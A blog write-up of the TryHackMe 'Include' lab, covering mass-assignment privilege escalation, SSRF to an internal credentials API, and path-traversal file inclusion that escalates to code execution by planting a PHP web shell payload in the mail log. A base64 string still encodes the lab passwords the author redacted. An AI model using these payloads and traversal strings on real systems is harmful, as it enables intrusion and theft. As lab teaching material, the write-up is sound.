<!doctype html><html lang=en prefix="og: http://ogp.me/ns# article: http://ogp.me/ns/article# profile: http://ogp.me/ns/profile#"><head><base href=https://www.aviskase.com/articles/2025/03/05/writeup-tryhackme-include/><title>Writeup: TryHackMe Include | aviskase</title>
<meta name=viewport content="width=device-width,initial-scale=1"><meta charset=utf-8><meta property="og:title" content="Writeup: TryHackMe Include"><meta name=twitter:title content="Writeup: TryHackMe Include"><meta property="og:description" content="
    
Include
Difficulty: medium
Platform: web, linux

This challenge is an initial test to evaluate your capabilities in web pentesting, particularly for server-side attacks.
Even if it&rsquo;s not accessible from the browser, can you still find a way to capture the flags and sneak into the secret admin panel?
Answer the questions below"><meta property="twitter:description" content="
    
Include
Difficulty: medium
Platform: web, linux

This challenge is an initial test to evaluate your capabilities in web pentesting, particularly for server-side attacks.
Even if it&rsquo;s not accessible from the browser, can you still find a way to capture the flags and sneak into the secret admin panel?
Answer the questions below"><meta name=description content="
    
Include
Difficulty: medium
Platform: web, linux

This challenge is an initial test to evaluate your capabilities in web pentesting, particularly for server-side attacks.
Even if it&rsquo;s not accessible from the browser, can you still find a way to capture the flags and sneak into the secret admin panel?
Answer the questions below"><meta property="og:url" content="https://www.aviskase.com/articles/2025/03/05/writeup-tryhackme-include/"><link rel=canonical href=https://www.aviskase.com/articles/2025/03/05/writeup-tryhackme-include/><meta property="og:type" content="article"><meta property="article:published_time" content="2025-03-05T16:35:52+00:00"><meta property="article:modified_time" content="2025-03-05T16:35:52+00:00"><meta property="og:site_name" content="aviskase"><meta property="article:author" content="https://www.aviskase.com/pages/about/"><meta name=twitter:card content="summary"><meta name=twitter:creator content="@aviskase"><link rel=me href=https://infosec.exchange/@aviskase><meta name=fediverse:creator content="@aviskase@infosec.exchange"><meta name=generator content="Hugo 0.145.0"><link rel=stylesheet href=/css/main.min.ca48c6814c31edf9882ef3867639528fca645f35d37a413cff2498aa6cd18644.css integrity="sha256-ykjGgUwx7fmILvOGdjlSj8pkXzXTekE8/ySYqmzRhkQ="><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=manifest href=/site.webmanifest></head><body><header><a href=/ class=title>aviskase</a><p><a href=/>Home</a>
<a href=/pages/about/>About</a>
<a href=/pages/archive/>Archive</a>
<a href=/feeds/all.atom.xml>RSS</a></p></header><main><div class=title><h1>Writeup: TryHackMe Include</h1></div><table class=article-props><tr><th class=width-min>published</th><td class=width-auto>2025-03-05</td></tr><tr><th class=width-min>reading&nbsp;time</th><td class=width-auto>4&nbsp;mins</td></tr><tr><th class=width-min>categories</th><td class=width-auto><a href=/categories/it/>it</a>, <a href=/categories/writeups/>writeups</a></td></tr></table><article><div class="callout info"><ul><li><a href=https://tryhackme.com/room/include class=external-link>Include</a></li><li>Difficulty: medium</li><li>Platform: web, linux</li></ul><p>This challenge is an initial test to evaluate your capabilities in web pentesting, particularly for server-side attacks.</p><p>Even if it&rsquo;s not accessible from the browser, can you still find a way to capture the flags and sneak into the secret admin panel?</p><p>Answer the questions below</p><ol><li>What is the flag value after logging in to the SysMon app?</li><li>What is the content of the hidden text file in <code>/var/www/html</code>?</li></ol></div><p>This room acts as a final challenge for the advanced server-side attacks module. Vulnerabilities explored:</p><ul><li>Broken object property level authorization (BOPLA)</li><li>Information disclosure</li><li>SSRF</li><li>LFI2RCE via log poisoning</li></ul><div class="callout toc"><nav id=TableOfContents><ol><li><a href=#information-gathering>Information gathering</a></li><li><a href=#privilege-escalation-via-mass-assignment-vulnerability>Privilege escalation via mass assignment vulnerability</a></li><li><a href=#getting-admin-credentials-via-ssrf>Getting admin credentials via SSRF</a></li><li><a href=#first-flag>First flag</a></li><li><a href=#lfi2rce-via-log-poisoning>LFI2RCE via log poisoning</a></li><li><a href=#second-flag>Second flag</a></li></ol></nav></div><h2 id=information-gathering><a href=#information-gathering>Information gathering</a></h2><p>I started with a port scan:</p><div class=highlight><pre tabindex=0 style=color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ sudo nmap -sS -vv -T4 MACHINE_IP
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>PORT      STATE SERVICE  REASON         VERSION
</span></span><span style=display:flex><span>22/tcp    open  ssh      syn-ack ttl <span style=color:#fab387>61</span> OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 <span style=color:#89dceb;font-weight:700>(</span>Ubuntu Linux; protocol 2.0<span style=color:#89dceb;font-weight:700>)</span>
</span></span><span style=display:flex><span>25/tcp    open  smtp     syn-ack ttl <span style=color:#fab387>61</span> Postfix smtpd
</span></span><span style=display:flex><span>110/tcp   open  pop3     syn-ack ttl <span style=color:#fab387>61</span> Dovecot pop3d
</span></span><span style=display:flex><span>143/tcp   open  imap     syn-ack ttl <span style=color:#fab387>61</span> Dovecot imapd <span style=color:#89dceb;font-weight:700>(</span>Ubuntu<span style=color:#89dceb;font-weight:700>)</span>
</span></span><span style=display:flex><span>993/tcp   open  ssl/imap syn-ack ttl <span style=color:#fab387>61</span> Dovecot imapd <span style=color:#89dceb;font-weight:700>(</span>Ubuntu<span style=color:#89dceb;font-weight:700>)</span>
</span></span><span style=display:flex><span>995/tcp   open  ssl/pop3 syn-ack ttl <span style=color:#fab387>61</span> Dovecot pop3d
</span></span><span style=display:flex><span>4000/tcp  open  http     syn-ack ttl <span style=color:#fab387>61</span> Node.js <span style=color:#89dceb;font-weight:700>(</span>Express middleware<span style=color:#89dceb;font-weight:700>)</span>
</span></span><span style=display:flex><span>50000/tcp open  http     syn-ack ttl <span style=color:#fab387>61</span> Apache httpd 2.4.41 <span style=color:#89dceb;font-weight:700>((</span>Ubuntu<span style=color:#89dceb;font-weight:700>))</span>
</span></span><span style=display:flex><span>Service Info: Host:  mail.filepath.lab; OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span></code></pre></div><p>There are lots of open ports: SSH, two web apps, and a mail server.</p><p>The first web app running on port 5000 is a SysMon portal. We need to find a way into it to get the first flag.</p><p><img src=ctf_include_sysmon_home.png alt="Screenshot of SysMon app"></p><p>The second web app is running on port 4000.</p><p><img src=ctf_include_social_login.png alt="Screenshot of review web app login page"></p><p>Here, I almost missed the big &ldquo;Sign In using guest/guest&rdquo; phrase.</p><h2 id=privilege-escalation-via-mass-assignment-vulnerability><a href=#privilege-escalation-via-mass-assignment-vulnerability>Privilege escalation via mass assignment vulnerability</a></h2><p>Logging in with guest credentials displays several profiles. Current user profile exposes a lot of properties which can be considered <a href=https://owasp.org/API-Security/editions/2023/en/0xa3-broken-object-property-level-authorization/ class=external-link>an excessive data exposure part of BOPLA</a> vulnerability. And there is a form which allows adding new properties.</p><p><img src=ctf_include_profile.png alt="Screenshot of user profile"></p><p>The form is vulnerable to the BOPLA&rsquo;s mass assignment attack, so I used it to escalate current user privileges to the administrator by changing value of <code>isAdmin</code> property.</p><p><img src=ctf_include_admin_form.png alt="Screenshot of the form set to isAdmin and true values"></p><div class="callout note"><p>Some writeups call this prototype pollution vulnerability, which is incorrect: we don&rsquo;t modify object prototype here.</p></div><h2 id=getting-admin-credentials-via-ssrf><a href=#getting-admin-credentials-via-ssrf>Getting admin credentials via SSRF</a></h2><p>After successful privilege escalation, the page has two new links: &ldquo;API&rdquo; and &ldquo;Settings&rdquo;.</p><p><img src=ctf_include_profile_admin.png alt="Screenshot of the page with new links"></p><p>On &ldquo;API&rdquo; page there is information about how to access internal APIs; one endpoint allows getting administrator credentials.</p><div class=highlight><pre tabindex=0 style=color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>API Dashboard
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Below is a list of important APIs accessible to admins with sample requests and responses:
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Internal API
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>GET http://127.0.0.1:5000/internal-api HTTP/1.1
</span></span><span style=display:flex><span>Host: 127.0.0.1:5000
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Response:
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    &#34;secretKey&#34;: &#34;superSecretKey123&#34;,
</span></span><span style=display:flex><span>    &#34;confidentialInfo&#34;: &#34;This is very confidential.&#34;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Get Admins API
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>GET http://127.0.0.1:5000/getAllAdmins101099991 HTTP/1.1
</span></span><span style=display:flex><span>Host: 127.0.0.1:5000
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Response:
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    &#34;ReviewAppUsername&#34;: &#34;admin&#34;,
</span></span><span style=display:flex><span>    &#34;ReviewAppPassword&#34;: &#34;xxxxxx&#34;,
</span></span><span style=display:flex><span>    &#34;SysMonAppUsername&#34;: &#34;administrator&#34;,
</span></span><span style=display:flex><span>    &#34;SysMonAppPassword&#34;: &#34;xxxxxxxxx&#34;,
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>&ldquo;Settings&rdquo; page allows changing banner image by providing URL.</p><p><img src=ctf_include_admin_settings.png alt="Screeenshot of Admin Settings page"></p><p>This page is vulnerable to SSRF attack. Instead of image URL I provided credentials endpoint:</p><p><img src=ctf_include_banner_ssrf.png alt="Screenshot of form set to credentials API url"></p><p>The page includes the response in base64 encoded format:</p><p><img src=ctf_include_ssrf_response.png alt="Screenshot of the page displaying result of SSRF"></p><p>I used CyberChef to decode it:</p><div class=highlight><pre tabindex=0 style=color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>data:application/json; charset=utf-8;base64,eyJSZXZpZXdBcHBVc2VybmFtZSI6ImFkbWluIiwiUmV2aWV3QXBwUGFzc3dvcmQiOiJhZG1pbkAhISEiLCJTeXNNb25BcHBVc2VybmFtZSI6ImFkbWluaXN0cmF0b3IiLCJTeXNNb25BcHBQYXNzd29yZCI6IlMkOSRxazZkIyoqTFFVIn0= 
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>---
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>{&#34;ReviewAppUsername&#34;:&#34;admin&#34;,&#34;ReviewAppPassword&#34;:&#34;REDACTED&#34;,&#34;SysMonAppUsername&#34;:&#34;administrator&#34;,&#34;SysMonAppPassword&#34;:&#34;REDACTED&#34;}
</span></span></code></pre></div><h2 id=first-flag><a href=#first-flag>First flag</a></h2><p>With these credentials I logged into SysMon app and got the first flag.</p><p><img src=ctf_include_sysmon_dashboard.png alt="Screenshot of the dashboard with displayed flag"></p><h2 id=lfi2rce-via-log-poisoning><a href=#lfi2rce-via-log-poisoning>LFI2RCE via log poisoning</a></h2><p>Profile picture on the dashboard has a curious <code>src</code>:</p><div class=highlight><pre tabindex=0 style=color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>&lt;<span style=color:#cba6f7>img</span> <span style=color:#89b4fa>src</span><span style=color:#89dceb;font-weight:700>=</span><span style=color:#a6e3a1>&#34;profile.php?img=profile.png&#34;</span> <span style=color:#89b4fa>class</span><span style=color:#89dceb;font-weight:700>=</span><span style=color:#a6e3a1>&#34;img-fluid rounded-circle mb-3 profile-pic&#34;</span> <span style=color:#89b4fa>alt</span><span style=color:#89dceb;font-weight:700>=</span><span style=color:#a6e3a1>&#34;User Profile Picture&#34;</span>&gt;
</span></span></code></pre></div><p>To check whether it is vulnerable to local file inclusion I used <code>ffuf</code>:</p><div class=highlight><pre tabindex=0 style=color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>$ ffuf -r -c -request req -request-proto &#39;http&#39; -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -fs 0
</span></span><span style=display:flex><span>...
</span></span><span style=display:flex><span>....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 2231, Words: 20, Lines: 42, Duration: 100ms]
</span></span><span style=display:flex><span>....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 2231, Words: 20, Lines: 42, Duration: 100ms]
</span></span></code></pre></div><p>Since the second flag is found on the file system, I guessed I needed to achieve LFI2RCE. Initially, I unsuccessfully attempted Apache log poisoning.</p><p>Remembering that there was a mail server, I tried <a href=https://swisskyrepo.github.io/PayloadsAllTheThings/File%20Inclusion/LFI-to-RCE/#rce-via-mail class=external-link>mail log poisoning</a>. First, I confirmed that the file <code>/var/log/mail.log</code> can be accessed.</p><div class=highlight><pre tabindex=0 style=color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-gdscript3 data-lang=gdscript3><span style=display:flex><span>http:<span style=color:#89dceb;font-weight:700>//</span>MACHINE_IP:<span style=color:#fab387>50000</span><span style=color:#89dceb;font-weight:700>/</span>profile<span style=color:#89dceb;font-weight:700>.</span>php<span style=color:#f38ba8>?</span>img<span style=color:#89dceb;font-weight:700>=....//....//....//....//....//....//....//....//....//</span><span style=color:#cba6f7>var</span><span style=color:#89dceb;font-weight:700>/</span><span style=color:#89dceb>log</span><span style=color:#89dceb;font-weight:700>/</span>mail<span style=color:#89dceb;font-weight:700>.</span>log
</span></span></code></pre></div><p>Next, to poison the log, I sent PHP code payload as an address:</p><div class=highlight><pre tabindex=0 style=color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>$ telnet MACHINE_IP 25
</span></span><span style=display:flex><span>...
</span></span><span style=display:flex><span>220 mail.filepath.lab ESMTP Postfix (Ubuntu)
</span></span><span style=display:flex><span>helo ok
</span></span><span style=display:flex><span>250 mail.filepath.lab
</span></span><span style=display:flex><span>mail from: &lt;?php system($_GET[&#34;cmd&#34;]); ?&gt;
</span></span><span style=display:flex><span>501 5.1.7 Bad sender address syntax
</span></span><span style=display:flex><span>quit
</span></span><span style=display:flex><span>221 2.0.0 Bye
</span></span><span style=display:flex><span>Connection closed by foreign host.
</span></span></code></pre></div><p>Now we can use <code>cmd</code> parameter to run commands on the system.</p><h2 id=second-flag><a href=#second-flag>Second flag</a></h2><p>While it&rsquo;s possible to <a href=https://jaxafed.github.io/posts/tryhackme_include/#log-poisoning-to-rce class=external-link>start a reverse shell and get access to the entire system</a>, I simply listed files:</p><div class=highlight><pre tabindex=0 style=color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-gdscript3 data-lang=gdscript3><span style=display:flex><span>http:<span style=color:#89dceb;font-weight:700>//</span>MACHINE_IP:<span style=color:#fab387>50000</span><span style=color:#89dceb;font-weight:700>/</span>profile<span style=color:#89dceb;font-weight:700>.</span>php<span style=color:#f38ba8>?</span>img<span style=color:#89dceb;font-weight:700>=....//....//....//....//....//....//....//....//....//</span><span style=color:#cba6f7>var</span><span style=color:#89dceb;font-weight:700>/</span><span style=color:#89dceb>log</span><span style=color:#89dceb;font-weight:700>/</span>mail<span style=color:#89dceb;font-weight:700>.</span>log<span style=color:#89dceb;font-weight:700>&amp;</span>cmd<span style=color:#89dceb;font-weight:700>=</span>ls 
</span></span></code></pre></div><p>And then used LFI again to get the content of the flag file:</p><div class=highlight><pre tabindex=0 style=color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-gdscript3 data-lang=gdscript3><span style=display:flex><span>http:<span style=color:#89dceb;font-weight:700>//</span>MACHINE_IP:<span style=color:#fab387>50000</span><span style=color:#89dceb;font-weight:700>/</span>profile<span style=color:#89dceb;font-weight:700>.</span>php<span style=color:#f38ba8>?</span>img<span style=color:#89dceb;font-weight:700>=....//....//....//....//....//....//....//....//....//</span><span style=color:#cba6f7>var</span><span style=color:#89dceb;font-weight:700>/</span>www<span style=color:#89dceb;font-weight:700>/</span>html<span style=color:#89dceb;font-weight:700>/</span>REDACTED<span style=color:#89dceb;font-weight:700>.</span>txt 
</span></span></code></pre></div></article><div class=article-nav><span class=article-nav-old><a href=https://www.aviskase.com/articles/2025/02/23/three-eleven-years-of-february/ title="Three (eleven) years of February"><span class=arrow>◁</span>older</a>
</span><span class=article-nav-middle>&nbsp;&#183;&nbsp;&#183;&nbsp;&#183;&nbsp;</span>
<span class=article-nav-new><a href=https://www.aviskase.com/articles/2025/03/13/writeup-tryhackme-el-bandito/ title="Writeup: TryHackMe El Bandito">newer<span class=arrow>▶</span></a></span></div></main><footer><span>2025</span><a href=https://infosec.exchange/@aviskase rel=me><svg height="24" viewBox="0 0 24 24" width="24"><path d="m20.94 14c-.28 1.41-2.44 2.96-4.97 3.26-1.31.15-2.6.3-3.97.24-2.25-.11-4-.54-4-.54v.62c.32 2.22 2.22 2.35 4.03 2.42 1.82.05 3.44-.46 3.44-.46l.08 1.65s-1.28.68-3.55.81c-1.25.07-2.81-.03-4.62-.5-3.92-1.05-4.6-5.24-4.7-9.5l-.01-3.43c0-4.34 2.83-5.61 2.83-5.61C6.95 2.3 9.41 2 11.97 2h.06c2.56.0 5.02.3 6.47.96.0.0 2.83 1.27 2.83 5.61.0.0.04 3.21-.39 5.43M18 8.91c0-1.08-.3-1.91-.85-2.56-.56-.63-1.3-.96-2.23-.96-1.06.0-1.87.41-2.42 1.23l-.5.88-.5-.88c-.56-.82-1.36-1.23-2.43-1.23-.92.0-1.66.33-2.23.96C6.29 7 6 7.83 6 8.91v5.26h2.1V9.06c0-1.06.45-1.62 1.36-1.62 1 0 1.5.65 1.5 1.93v2.79h2.07V9.37c0-1.28.5-1.93 1.51-1.93.9.0 1.35.56 1.35 1.62v5.11H18z"/></svg></a><a href=mailto:aviskase@gmail.com>Yuliya Bagriy</a><a href=https://www.aviskase.com/pages/i-dont-track-you/>No tracking</a></footer></body></html>